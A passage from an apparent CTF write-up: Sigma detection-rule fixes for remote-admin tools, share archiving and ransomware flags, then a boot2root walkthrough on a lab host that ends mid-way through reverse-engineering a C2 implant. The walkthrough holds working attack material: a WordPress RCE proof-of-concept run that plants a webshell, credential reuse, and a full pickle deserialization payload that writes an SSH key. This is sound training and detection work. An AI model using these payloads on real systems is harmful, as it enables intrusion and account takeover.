    EventID: 7045
    ServiceFileName|contains:
      - 'AnyDesk.exe'
      - 'ScreenConnect'
      - 'TeamViewer'

  filter_workstation_class:
    ComputerName|startswith:
      - 'SNW-PC'
      - 'ALD-PC'
      - 'TBL-PC'

  condition: selection and not filter_workstation_class
```

**Lesson:** Never assume field names or event sources from a narrative alone — validate against real telemetry (event source, populated fields, actual values) before trusting a detection.

Solution:

```yaml
title: Remote Management Software Deployed as a Service on Non-Workstation Systems
id: 6e4f2418-b99a-4df2-868f-fe4086055996
status: experimental
description: Identifies the installation of remote administration software as a Windows service on server-class assets. Within Cascadia's environment, these tools are authorized only on employee workstations, making their presence on server infrastructure a potential indicator of unauthorized persistence activity.

author: morgan-reyes

logsource:
  product: windows
  service: security

detection:
  rat_service_install:
    EventID: 7045
    ServiceFileName|contains:
      - 'AnyDesk.exe'
      - 'ScreenConnect'
      - 'TeamViewer'

  trusted_workstations:
    ComputerName|startswith:
      - 'SNW-PC'
      - 'ALD-PC'
      - 'TBL-PC'

  condition: rat_service_install and not trusted_workstations
```

Merge and we get the flag for PR#3.

### PR#4 — 7-Zip Archives Data Directly From a Live Network Share

Detects 7-Zip archiving operations referencing a UNC network share path directly, consistent with POWDER WOLF's collection staging before exfiltration.

Original rule:

```yaml
title: 7-Zip Archives Data Directly From a Live Network Share
id: 2a3f3da0-0725-4ef1-a857-05fcf21b0f8c
status: experimental
description: Detects a 7-Zip archiving operation whose command line references a UNC network share path directly rather than local user documents, consistent with POWDER WOLF's collection staging ahead of exfiltration.
author: morgan-reyes
logsource:
  product: windows
  category: process_creation

detection:
  selection:
    Image|endswith:
      - '\7zG.exe'
      - '\7zFM.exe'
      - '\7z.exe'
    CommandLine|contains: '-p'
  condition: selection
```

**Issue:** The primary indicator, `CommandLine|contains: '-p'`, never actually appeared in the attacker's command lines. The real signal was archiving directly from a live UNC share, not any specific flag.

**Troubleshooting:** Attempts to match generic UNC paths (`'\\'`/`'\\\\'`) converted to an overly broad Splunk query (`CommandLine="*\\*"`), producing 24 false positives from a legitimate shared-backup process. The fix was to target specific server/share names instead of a generic path pattern.

**Additional gaps closed:**

* Added WinRAR/RAR to cover alternative archivers.
* Added PowerShell `Compress-Archive` to cover non-third-party compression.
* Switched to `OriginalFileName` instead of executable path to resist renamed-binary evasion.
* Extended scope beyond `FS-RESV01` to other critical server shares.

**Fix:** Detect archive creation targeting known server shares via common tools or PowerShell, excluding a legitimate monthly export process.

```yaml
detection:
  selection_archiver_tools:
    OriginalFileName:
      - '7z.exe'
      - '7zFM.exe'
      - '7zG.exe'
      - 'WinRAR.exe'
      - 'Rar.exe'
    CommandLine|contains:
      - 'FS-RESV01\'
      - 'BKP-CSRC01\'
      - 'DC-CSRC01\'
      - 'DC-CSRC02\'
      - 'DC-CSRC03\'
      - 'HV-CSRC01\'

  selection_ps_tool:
    Image|endswith: '\powershell.exe'
    CommandLine|contains: 'Compress-Archive'

  selection_ps_share:
    CommandLine|contains:
      - 'FS-RESV01\'
      - 'BKP-CSRC01\'
      - 'DC-CSRC01\'
      - 'DC-CSRC02\'
      - 'DC-CSRC03\'
      - 'HV-CSRC01\'

  filter_monthly_export:
    ParentImage|endswith: '\wscript.exe'
    CommandLine|contains: 'ReservationsExport_'

  condition: (selection_archiver_tools or (selection_ps_tool and selection_ps_share)) and not filter_monthly_export
```

**Lesson:** Detect actual observed behavior rather than assumed command-line flags, and always validate how Sigma rules convert to the target SIEM — escaping/pattern issues can massively change behavior.

Solution:

```yaml
title: Compression Utilities Accessing Server Share Paths for Data Packaging
id: 2a3f3da0-0725-4ef1-a857-05fcf21b0f8c
status: experimental
description: Identifies archive creation activity involving remote server shares through common compression tools or PowerShell. Compressing data directly from infrastructure-hosted shares instead of local directories may indicate collection and staging behavior prior to data transfer.

author: morgan-reyes

logsource:
  product: windows
  category: process_creation

detection:
  archive_tool_activity:
    OriginalFileName:
      - '7z.exe'
      - '7zFM.exe'
      - '7zG.exe'
      - 'WinRAR.exe'
      - 'Rar.exe'
    CommandLine|contains:
      - 'FS-RESV01\'
      - 'BKP-CSRC01\'
      - 'DC-CSRC01\'
      - 'DC-CSRC02\'
      - 'DC-CSRC03\'
      - 'HV-CSRC01\'

  powershell_archive:
    Image|endswith: '\powershell.exe'
    CommandLine|contains: 'Compress-Archive'

  server_share_reference:
    CommandLine|contains:
      - 'FS-RESV01\'
      - 'BKP-CSRC01\'
      - 'DC-CSRC01\'
      - 'DC-CSRC02\'
      - 'DC-CSRC03\'
      - 'HV-CSRC01\'

  approved_export_task:
    ParentImage|endswith: '\wscript.exe'
    CommandLine|contains: 'ReservationsExport_'

  condition: (archive_tool_activity or (powershell_archive and server_share_reference)) and not approved_export_task
```

Merge and we get the flag for PR#4.

### PR#5 — Lynx Ransomware Payload Executed With Distinctive Encryption Flags

Detects the Lynx ransomware payload via its distinctive drive/speed/verbosity flags, consistent with POWDER WOLF's fleet-wide deployment staging.

Original rule:

```yaml
title: Lynx Ransomware Payload Executed With Distinctive Encryption Flags
id: fef37376-5b9b-4ada-b67b-2ce4d9177323
status: experimental
description: Detects execution of the Lynx ransomware payload via its distinctive command line flags controlling target drive, encryption speed, and verbosity, consistent with POWDER WOLF's fleet wide deployment staging.
author: morgan-reyes
logsource:
  product: windows
  category: process_creation

detection:
  selection:
    ParentImage|endswith: '\services.exe'
    CommandLine|contains: 'w.exe'
  condition: selection
```

**Issues found:**

1. `ParentImage|endswith: '\services.exe'` was wrong — the real process was launched by `cmd.exe`, so the rule missed it entirely.
2. A legitimate nightly task, `DiskOptimizer.exe`, shared the same `--dir`/`--mode fast` arguments, causing false positives without extra filtering.
3. An initial fix requiring `\w.exe` and excluding `DiskOptimizer.exe` by path/`OriginalFileName` was bypassed in testing by renaming a malicious binary to `DiskOptimizer.exe` and dropping it alongside the legitimate app — since primary selection depended on the `\w.exe` name match, the impostor never even reached the exclusion filter.

**Fix:** Drop filename assumptions entirely; detect on the attacker-controlled command-line arguments alone, and exclude legitimate activity via the harder-to-spoof `OriginalFileName` PE metadata.

```yaml
detection:
  selection:
    CommandLine|contains|all:
      - '--dir'
      - '--mode fast'

  filter_diskoptimizer:
    OriginalFileName: 'DiskOptimizer.exe'

  condition: selection and not filter_diskoptimizer
```

**Lesson:** An exclusion filter is only as strong as the field it trusts. File paths/names are easy to replicate once an attacker knows the environment; embedded PE metadata like `OriginalFileName` is harder to spoof and more resistant to masquerading.

Solution:

```yaml
title: Suspicious Encryption Utility Launched With Ransomware-Style Parameters
id: fef37376-5b9b-4ada-b67b-2ce4d9177323
status: experimental
description: Identifies process executions that use command-line arguments commonly associated with the Lynx ransomware's encryption workflow. The detection focuses on characteristic operational flags while excluding a known legitimate maintenance utility used within the environment.

author: morgan-reyes

logsource:
  product: windows
  category: process_creation

detection:
  encryption_flag_activity:
    CommandLine|contains|all:
      - '--dir'
      - '--mode fast'

  trusted_maintenance_tool:
    OriginalFileName: 'DiskOptimizer.exe'

  condition: encryption_flag_activity and not trusted_maintenance_tool
```

Merge and we get the flag for PR#5.

## Agent P (Boot2Root)

> Something on Heinz's machine keeps phoning home. A host inside "A hosts of sorts!" is beaconing out on a schedule nobody authorized, and the team that owns it swears everything's fine. It isn't. Someone's already inside, quietly holding root and running the show through their own tooling. Get a foothold, work out who's really in control, and take it back from them before they notice you looking.

### Reconnaissance

```shell
┌──(kuroshiro㉿a1sberg)-[~/Downloads/DefCon/AgentP]
└─$ nmap -A 10.49.137.253 -T5
Starting Nmap 7.95 ( https://nmap.org ) at 2026-08-13 05:27 UTC
Nmap scan report for 10.49.137.253
Host is up (0.14s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.18 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 a8:b4:3d:5e:1f:ef:de:74:61:b3:49:15:13:a3:1a:59 (ECDSA)
|_  256 fd:57:95:fb:8d:6d:0e:a3:dc:3d:9b:0f:63:2a:c2:e8 (ED25519)
80/tcp open  http    Apache httpd 2.4.58 ((Ubuntu))
|_http-title: An incorporation of sorts!
|_http-server-header: Apache/2.4.58 (Ubuntu)
|_http-generator: WordPress 6.9
Aggressive OS guesses: Linux 4.15 - 5.19 (93%), Linux 4.15 (92%), Linux 5.4 (92%), Asus RT-N10 router or AXIS 211A Network Camera (Linux 2.6) (91%), Linux 2.6.18 (91%), Linux 4.10 (91%), Linux 2.6.16 (91%), HP P2000 G3 NAS device (91%), Android 10 - 12 (Linux 4.14 - 4.19) (90%), Adtran 424RG FTTH gateway (90%)
No exact OS matches for host (test conditions non-ideal).                                                                                                                                                         
Network Distance: 3 hops                                                                                                                                                                                          
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 8888/tcp)
HOP RTT       ADDRESS
1   198.62 ms 192.168.128.1
2   ...
3   198.56 ms 10.49.137.253

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 28.11 seconds
```

Only two ports open. Port 22 (OpenSSH) usually needs credentials to be useful early on. Port 80 (Apache) fingerprinted as **WordPress 6.9**, which stood out as a promising lead.

### WordPress Enumeration

```shell
┌──(kuroshiro㉿a1sberg)-[~/Downloads/DefCon/AgentP]
└─$ wpscan --url http://10.49.137.253/ -e vp,vt,u --api-token <API_TOKEN_FROM_WPSCAN>
_______________________________________________________________
         __          _______   _____
         \ \        / /  __ \ / ____|
          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
            \  /\  /  | |     ____) | (__| (_| | | | |
             \/  \/   |_|    |_____/ \___|\__,_|_| |_|

         WordPress Security Scanner by the WPScan Team
                         Version 3.8.28
                               
       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
_______________________________________________________________

[i] Updating the Database ...
[i] Update completed.

[+] URL: http://10.49.137.253/ [10.49.137.253]
[+] Started: Thu Aug 13 05:34:02 2026

Interesting Finding(s):

[+] Headers
 | Interesting Entry: Server: Apache/2.4.58 (Ubuntu)
 | Found By: Headers (Passive Detection)
 | Confidence: 100%

[+] XML-RPC seems to be enabled: http://10.49.137.253/xmlrpc.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%
 | References:
 |  - http://codex.wordpress.org/XML-RPC_Pingback_API
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/
 |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/

[+] WordPress readme found: http://10.49.137.253/readme.html
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] Upload directory has listing enabled: http://10.49.137.253/wp-content/uploads/
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] The external WP-Cron seems to be enabled: http://10.49.137.253/wp-cron.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 60%
 | References:
 |  - https://www.iplocation.net/defend-wordpress-from-ddos
 |  - https://github.com/wpscanteam/wpscan/issues/1299

[+] WordPress version 6.9 identified (Insecure, released on 2025-12-02).
 | Found By: Rss Generator (Passive Detection)
 |  - http://10.49.137.253/index.php/feed/, <generator>https://wordpress.org/?v=6.9</generator>
 |  - http://10.49.137.253/index.php/comments/feed/, <generator>https://wordpress.org/?v=6.9</generator>
 |
 | [!] 14 vulnerabilities identified:
 |
 | [!] Title: WP < 7.0.2 - Facilitated SQLi
 |     Fixed in: 6.9.5
 |     References:
 |      - https://wpscan.com/vulnerability/82a6c423-547b-4910-aea5-044070b08949
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2026-60137
 |      - https://wordpress.org/news/2026/07/wordpress-7-0-2-release/
 |      - https://github.com/WordPress/wordpress-develop/security/advisories/GHSA-fpp7-x2x2-2mjf
 |
 | [!] Title: WordPress < 7.0.2 - REST API batch-route confusion and SQLi to RCE
 |     Fixed in: 6.9.5
 |     References:
 |      - https://wpscan.com/vulnerability/73310d64-e790-4a78-ab0a-12995b762dba
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2026-63030
 |      - https://wordpress.org/news/2026/07/wordpress-7-0-2-release/
 |      - https://github.com/WordPress/wordpress-develop/security/advisories/GHSA-ff9f-jf42-662q
 ...
 ```

Confirmed: WordPress 6.9 is affected by **CVE-2026-63030**, a critical REST API batch-request vulnerability.

```text
[!] Title: WordPress < 7.0.2 - REST API batch-route confusion and SQLi to RCE
    Fixed in: 6.9.5
    CVE: CVE-2026-63030
```

### Exploiting the REST API Vulnerability

The bug is a route-confusion flaw in the REST API's batch processing: WordPress mishandles batched requests, letting an attacker reach backend functionality in unintended ways, which chains into unauthenticated SQL injection — no valid account required.

The `wp2shell` PoC automates the full chain: it abuses the vulnerable REST API to gain admin access, then abuses legitimate WordPress functionality to execute code.

```text
REST API Vulnerability
        ↓
Unauthenticated SQL Injection
        ↓
Privilege Escalation / Admin Access
        ↓
Authenticated Code Execution
        ↓
Remote Code Execution (RCE)
```

Using `0xsha`'s [PoC](https://github.com/0xsha/wp2shell), I first verified the target was affected:

```shell
┌──(kuroshiro㉿a1sberg)-[~/Downloads/DefCon/AgentP/wp2shell]
└─$ python3 wp2shell.py check http://10.49.137.253/wp-trackback.php
wp2shell - RCE PoC by 0xsha
[*] WordPress version: unknown (could not fingerprint)
[+] Batch endpoint reachable and unauthenticated (HTTP 207) at http://10.49.137.253/wp-trackback.php/wp-json/batch/v1
[+] Route confusion ACTIVE - categories request answered by the block-renderer handler (block_cannot_read); CVE-2026-63030 confirmed.
[+] SQL injection CONFIRMED - boolean-blind differential over author__not_in (CVE-2026-60137).
[+] Time-based channel also confirmed - baseline 0.42s vs injected 3.72s.
```

Confirmed reachable and vulnerable. Next, I ran the PoC's `shell` mode to automate the full attack chain:

```shell
┌──(kuroshiro㉿a1sberg)-[~/Downloads/DefCon/AgentP/wp2shell]
└─$ python3 wp2shell.py shell http://10.49.137.253 -i
wp2shell - RCE PoC by 0xsha
[*] No credentials supplied - creating a fresh administrator pre-auth (no hash, no crack) ...
[+] Administrator created: wp2_7b94164671f6 / Wp2!VYjhLaroCrZe9yexncL4  (borrowed admin id 1)
[!] This uploads a plugin containing a webshell to the target.
[*] Authenticating as 'wp2_7b94164671f6' ...
[+] Authenticated.
[*] Deploying webshell plugin ...
[+] Webshell: http://10.49.137.253/wp-content/plugins/wp2shell_7f499fed/wp2shell_7f499fed.php
[*] Interactive shell - 'exit' or Ctrl-D to quit.
/var/www/html/wp-content/plugins/wp2shell_7f499fed $ 
```

The exploit used the SQLi to create a fresh admin account directly, then used those creds to upload a malicious plugin containing a webshell, dropping me into the web server's filesystem — RCE confirmed.

### Credential Reuse to `norm`

`wp-config.php` is always worth checking for database credentials:

```shell
/var/www/html $ cat wp-config.php
<?php
/**
 * The base configuration for WordPress
 *
 * The wp-config.php creation script uses this file during the installation.
 * You don't have to use the web site, you can copy this file to "wp-config.php"
 * and fill in the values.
 *
 * This file contains the following configurations:
 *
 * * Database settings
 * * Secret keys
 * * Database table prefix
 * * Localized language
 * * ABSPATH
 *
 * @link https://wordpress.org/support/article/editing-wp-config-php/
 *
 * @package WordPress
 */

// ** Database settings - You can get this info from your web host ** //
/** The name of the database for WordPress */
define( 'DB_NAME', 'wordpress' );

/** Database username */
define( 'DB_USER', 'wpuser' );

/** Database password */
define( 'DB_PASSWORD', 'wp_WjURfdI' );

/** Database hostname */
define( 'DB_HOST', 'localhost' );

/** Database charset to use in creating database tables. */
define( 'DB_CHARSET', 'utf8' );

/** The database collate type. Don't change this if in doubt. */
define( 'DB_COLLATE', '' );
...
```

These credentials could plausibly be reused elsewhere on the box:

```shell
/var/www/html $ mysql -uwpuser -pwp_WjURfdI wordpress -e 'SHOW TABLES;'
Tables_in_wordpress
wp_commentmeta
wp_comments
wp_infra_accounts
wp_links
wp_options
wp_postmeta
wp_posts
wp_term_relationships
wp_term_taxonomy
wp_termmeta
wp_terms
wp_usermeta
wp_users
```

The `wp_infra_accounts` table stood out:

```shell
/var/www/html $ mysql -uwpuser -pwp_WjURfdI wordpress -e 'SELECT * FROM wp_infra_accounts;'
host_user       host_pass       note
norm    N0rm_th3_r0b0t_2026     ssh sync target for the -inator newsletter cron
```

`norm` is a valid local account (confirmed via `/home`), so I tried the recovered password over SSH:

```shell
┌──(kuroshiro㉿a1sberg)-[~/Downloads/DefCon/AgentP]
└─$ ssh norm@10.49.137.253
The authenticity of host '10.49.137.253 (10.49.137.253)' can't be established.
ED25519 key fingerprint is SHA256:Ts1vf8kiot4pVFQfTlofRYitoTOTHE0B1fcUhRudLvU.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.49.137.253' (ED25519) to the list of known hosts.
norm@10.49.137.253's password: 
Welcome to Ubuntu 24.04.4 LTS (GNU/Linux 7.0.0-1010-aws x86_64)
...
Expanded Security Maintenance for Applications is not enabled.

0 updates can be applied immediately.

3 additional security updates can be applied with ESM Apps.
Learn more about enabling ESM Apps service at https://ubuntu.com/esm


The list of available updates is more than a week old.
To check for new updates run: sudo apt update

Last login: Sat Jul 25 13:23:19 2026 from 192.168.129.8
norm@tryhackme-2404:~$ 
```

It worked — user flag time:

```shell
norm@tryhackme-2404:~$ cat user.txt
EVILINC{REDACTED}
```

### Lateral Movement to `vanessa`

Process enumeration revealed a Gunicorn-hosted Flask app owned by `vanessa`:

```shell
norm@tryhackme-2404:~$ ps aux
...
vanessa      804  0.0  0.7  42364 30224 ?        S    05:13   0:00 /usr/bin/python3 /usr/bin/gunicorn --bind 127.0.0.1:8700 --workers 2 app:app
vanessa      823  0.0  0.7  42500 30648 ?        S    05:13   0:00 /usr/bin/python3 /usr/bin/gunicorn --bind 127.0.0.1:8700 --workers 2 app:app
...
```

It's bound only to loopback (`127.0.0.1:8700`), two workers, entry point `app:app`. Running as `vanessa` rather than root/www-data made it a good escalation target.

Checking group membership:

```shell
norm@tryhackme-2404:~$ id
uid=1001(norm) gid=1002(norm) groups=1002(norm),1001(evilinc)
```

`norm` belongs to `evilinc`, so I searched for group-owned assets:

```shell
norm@tryhackme-2404:~$ find / -group evilinc 2>/dev/null
...
/etc/evilinc/panel.conf 
...
```

```shell
norm@tryhackme-2404:~$ cat /etc/evilinc/panel.conf
[panel]
operator_secret = b3hind_sch3dul3_th1s_m0nth
```

This secret looked like it would authenticate to the internal panel app I'd just found. I set up port forwarding and tested it:

```shell
┌──(kuroshiro㉿a1sberg)-[~/Downloads/DefCon/AgentP]
└─$ ssh -L 800:127.0.0.1:8700 norm@10.49.137.253
```

![](https://kur0sh1r0.gitbook.io/ctf-writeups/~gitbook/image?url=https%3A%2F%2F271954773-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FYsivTjPn2jLXI0ZgVqeF%252Fuploads%252FSiVgPm6Yv8KNlDUiB4jp%252FScreenshot%2520%283042%29.png%3Falt%3Dmedia%26token%3D238237f2-2c25-4e7d-b44d-4edc876f94f5&width=768&dpr=3&quality=100&sign=7741bb33&sv=2)

```shell
┌──(kuroshiro㉿a1sberg)-[~/Downloads/DefCon/AgentP/wp2shell]
└─$ curl -s -c cookies.txt -X POST http://127.0.0.1:800/api/login -d "secret=b3hind_sch3dul3_th1s_m0nth"
{"ok":true}
```

Authenticated, with the session saved to `cookies.txt`.

The `/api/blueprints/import` endpoint accepts a Base64-encoded Python pickle, nominally guarded by a `restricted_unpickler.py` that blacklists dangerous modules (`os`, `posix`, `subprocess`, `builtins`, `operator`). But it's a module blacklist, not a functionality restriction — `pydoc.locate()` isn't blocked and can dynamically resolve a dotted string (like `"os.system"`) into a callable at runtime, bypassing the filter entirely.

I used this to plant an SSH key for `vanessa` rather than just proving RCE. First, generate a key pair:

```shell
┌──(kuroshiro㉿a1sberg)-[~/Downloads/DefCon/AgentP/wp2shell]
└─$ ssh-keygen -t ed25519 -f vanessa_key -N ""
Generating public/private ed25519 key pair.
Your identification has been saved in vanessa_key
Your public key has been saved in vanessa_key.pub
The key fingerprint is:
SHA256:UtijBnP19VTLPdLuyZR0sps7vKZX9fVU+1TEu+D3od8 kuroshiro@a1sberg
The key's randomart image is:
+--[ED25519 256]--+
|        .   . .+o|
|       + . . oo *|
|    o o + .  .o*B|
|     + o .   .+=O|
|      + S   . o*B|
|     . .     .+**|
|             .==o|
|             .=.o|
|            .+++E|
+----[SHA256]-----+
```

Then a pickle payload that resolves `os.system` via `pydoc.locate()` to write it into `authorized_keys`:

```python
import pickle
import base64
import pydoc

class ResolverProxy:
    def __call__(self, *args, **kwargs):
        pass

    def __reduce__(self):
        return (pydoc.locate, ("os.system",))

with open("vanessa_key.pub") as key_file:
    ssh_public_key = key_file.read().strip()

shell_command = (
    "mkdir -p /home/vanessa/.ssh && "
    f'echo "{ssh_public_key}" >> /home/vanessa/.ssh/authorized_keys && '
    "chmod 700 /home/vanessa/.ssh && "
    "chmod 600 /home/vanessa/.ssh/authorized_keys"
)

class PayloadWrapper:
    def __reduce__(self):
        return (ResolverProxy(), (shell_command,))

serialized_blob = pickle.dumps(PayloadWrapper())
encoded_payload = base64.b64encode(serialized_blob).decode()

print(encoded_payload)
```

Submitted to the authenticated import endpoint:

```shell
┌──(kuroshiro㉿a1sberg)-[~/Downloads/DefCon/AgentP/wp2shell]
└─$ curl -s -b cookies.txt -X POST http://127.0.0.1:800/api/blueprints/import --data-urlencode "blueprint=$(python3 exploit.py)"
{"loaded":"0","ok":true}
```

And confirmed via SSH:

```shell
┌──(kuroshiro㉿a1sberg)-[~/Downloads/DefCon/AgentP/wp2shell]
└─$ ssh -i vanessa_key -o StrictHostKeyChecking=no vanessa@10.49.137.253 
Welcome to Ubuntu 24.04.4 LTS (GNU/Linux 7.0.0-1010-aws x86_64)
...
Expanded Security Maintenance for Applications is not enabled.

0 updates can be applied immediately.

3 additional security updates can be applied with ESM Apps.
Learn more about enabling ESM Apps service at https://ubuntu.com/esm


The list of available updates is more than a week old.
To check for new updates run: sudo apt update
Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings


Last login: Sat Jul 25 13:37:19 2026 from 192.168.129.8
vanessa@tryhackme-2404:~$ 
```

We're `vanessa`. Second user flag:

```shell
vanessa@tryhackme-2404:~$ cat operator.txt
EVILINC{REDACTED}
```

### Privilege Escalation via the `evilinc` Implant

Hunting for Unix domain sockets as `vanessa`:

```shell
vanessa@tryhackme-2404:~$ find / -type s 2>/dev/null
/run/mysqld/mysqld.sock
/run/evilinc/tasking.sock
/run/uuidd/request
/run/snapd-snap.socket
/run/snapd.socket
/run/lxd-installer.socket
/run/acpid.socket
```

`/run/evilinc/tasking.sock` stood out — tied to the custom `evilinc` app, and both `norm` and `vanessa` are in the `evilinc` group. The socket turned out to be group-writable, meaning unprivileged group members can talk directly to the app's C2 tasking interface.

```shell
vanessa@tryhackme-2404:/opt/evilinc$ ls
c2  implant
```

```shell
vanessa@tryhackme-2404:/opt/evilinc$ file implant
implant: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=7226fed57eda8f66f34893a69ba94fceed53bacd, for GNU/Linux 3.2.0, stripped
```

A stripped, PIE, 64-bit ELF — I pulled it to my machine and loaded it into Ghidra.

#### Generating the Implant Keystream

```c
void FUN_00101449(long param_1,int param_2)

{
  undefined4 local_10;
  undefined4 local_c;

  local_10 = 0x1a2b3c4d;

  for (local_c = 0; local_c < param_2; local_c = local_c + 1) {
    local_10 = local_10 * 0x41c64e6d + 0x3039;
    *(char *)(param_1 + local_c) = (char)((uint)local_10 >> 0x10);
  }

  return;
}
```

Generates a deterministic 32-byte keystream from a hardcoded LCG seed (`0x1a2b3c4d`), updating via `s = (s * 0x41c64e6d + 0x3039) mod 2^32` and extracting byte `(s >> 16) & 0xFF` each round. Fully reproducible offline since both seed and algorithm are embedded in the binary.

#### Deriving the HMAC Secret Key

```c
void FUN_001014a2(long param_1)

{
  long in_FS_OFFSET;
  int local_3c;
  byte local_38 [40];
  long local_10;
  
  local_10 = *(long *)(in_FS_OFFSET + 0x28);
  FUN_00101449(local_38,0x20);
  for (local_3c = 0; local_3c < 0x20; local_3c = local_3c + 1) {
    *(byte *)(param_1 + local_3c) = (&DAT_00102020)[local_3c] ^ local_38[local_3c];
  }
  if (local_10 != *(long *)(in_FS_OFFSET + 0x28)) {
                    /* WARNING: Subroutine does not return */
    __stack_chk_fail();
  }
  return;
}
```

XORs the 32-byte keystream against a constant stored at `.rodata+0x2020` to produce the HMAC key:

![](https://kur0sh1r0.gitbook.io/ctf-writeups/~gitbook/image?url=https%3A%2F%2F271954773-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FYsivTjPn2jLXI0ZgVqeF%252Fuploads%252F2k8lFzrU0kzEKyTqkJ0Q%252FScreenshot%2520%283044%29.png%3Falt%3Dmedia%26token%3D57df38ad-bc3f-4e8e-a55e-bbe64ac9fd6b&width=768&dpr=3&quality=100&sign=5c070658&sv=2)

Since both the constant and the LCG are embedded in the binary, this key is fully recoverable — meaning valid task signatures can later be forged.

#### Retrieving the Machine Identifier

```c
size_t FUN_00101529(void *param_1,long param_2)

{
  FILE *__stream;
  size_t local_18;
  
  __stream = fopen("/etc/machine-id","r");
  if (__stream == (FILE *)0x0) {
    local_18 = 0xffffffff;
  }
  else {
    local_18 = fread(param_1,1,param_2 - 1,__stream);
    fclose(__stream);
    for (; (local_18 != 0 &&
           (((*(char *)((long)param_1 + (local_18 - 1)) == '\n' ||
             (*(char *)((long)param_1 + (local_18 - 1)) == '\r')) ||
            (*(char *)((long)param_1 + (local_18 - 1)) == ' ')))); local_18 = local_18 - 1) {
    }
    *(undefined1 *)(local_18 + (long)param_1) = 0;
  }
  return local_18;
}
```

Reads and trims `/etc/machine-id`. The implant ties its identity to the host's machine ID, common for malware/management agents.

#### HMAC-SHA256 Task Verification

```c
void FUN_001016d7(void *param_1,int param_2,uchar *param_3,long param_4)

{
  size_t n;
  EVP_MD *evp_md;
  long in_FS_OFFSET;
  uint local_70;
  uint local_6c;
  byte local_68 [72];
  long local_20;
  
  local_20 = *(long *)(in_FS_OFFSET + 0x28);
  local_70 = 0;
  n = strlen((char *)param_3);
  evp_md = EVP_sha256();
  HMAC(evp_md,param_1,param_2,param_3,n,local_68,&local_70);
  for (local_6c = 0; local_6c < local_70; local_6c = local_6c + 1) {
    sprintf((char *)((ulong)(local_6c * 2) + param_4),"%02x",(ulong)local_68[local_6c]);
  }
  *(undefined1 *)(param_4 + (ulong)(local_70 * 2)) = 0;
  if (local_20 != *(long *)(in_FS_OFFSET + 0x28)) {
                    /* WARNING: Subroutine does not return */
    __stack_chk_fail();
  }
  return;
}
```

Computes an HMAC-SHA256 over incoming task data and hex-encodes it via OpenSSL's `HMAC()`, confirming every task must carry a valid signature or be rejected.

#### Connecting to the Tasking Service

```c
int FUN_001017d9(void)

{
  int __fd;
  int iVar1;
  long in_FS_OFFSET;
  sockaddr local_88 [7];
  long local_10;
  
  local_10 = *(long *)(in_FS_OFFSET + 0x28);
  __fd = socket(1,1,0);
  if (__fd < 0) {
    __fd = -1;
  }
  else {
    memset(local_88,0,0x6e);
    local_88[0].sa_family = 1;
    strncpy(local_88[0].sa_data,"/run/evilinc/tasking.sock",0x6b);
    iVar1 = connect(__fd,local_88,0x6e);
    if (iVar1 < 0) {
      close(__fd);
      __fd = -1;
    }
  }
  if (local_10 == *(long *)(in_FS_OFFSET + 0x28)) {
    return __fd;
  }
                    /* WARNING: Subroutine does not return */
  __stack_chk_fail();
}
```

Connects to `/run/evilinc/tasking.sock` — the same writable socket found during enumeration, confirming it's the implant's command channel.

#### Main Task Processing Loop

```c
void FUN_00101a48(void)

{
  int iVar1;
  long in_FS_OFFSET;
  undefined4 local_54c;
  char *local_548;
  char *local_540;
  long local_538;
  char *local_530;
  char *local_528;
  char *local_520;
  char *local_518;
  char *local_510;
  char *local_508;
  char *local_500;
  char *local_4f8;
  long local_4f0;
  undefined1 local_4e8 [64];
  char local_4a8 [144];
  char local_418 [1032];
  undefined8 local_10;
  
  local_10 = *(undefined8 *)(in_FS_OFFSET + 0x28);
  local_54c = 0;
  local_538 = 0;
  FUN_00101602(local_4e8,&local_54c);
  do {
    local_528 = (char *)FUN_001018ac(local_538);
    if (local_528 != (char *)0x0) {
      local_548 = (char *)0x0;
      local_530 = strtok_r(local_528,"\n",&local_548);
      while (local_530 != (char *)0x0) {
        iVar1 = strcmp(local_530,"END");
        if (iVar1 != 0) {
          local_520 = strdup(local_530);
          local_540 = (char *)0x0;
          local_518 = strtok_r(local_520,"|",&local_540);
          local_510 = strtok_r((char *)0x0,"|",&local_540);
          local_508 = strtok_r((char *)0x0,"|",&local_540);
          local_500 = strtok_r((char *)0x0,"|",&local_540);
          local_4f8 = strtok_r((char *)0x0,"|",&local_540);
          if ((((local_518 == (char *)0x0) || (local_510 == (char *)0x0)) ||
              (local_508 == (char *)0x0)) ||
             ((local_500 == (char *)0x0 || (local_4f8 == (char *)0x0)))) {
            free(local_520);
          }
          else {
            local_4f0 = atol(local_518);
            if (local_538 < local_4f0) {
              snprintf(local_418,0x400,"%s|%s|%s|%s",local_518,local_510,local_508,local_500);
              FUN_001016d7(local_4e8,local_54c,local_418,local_4a8);
              iVar1 = strcmp(local_4a8,local_4f8);
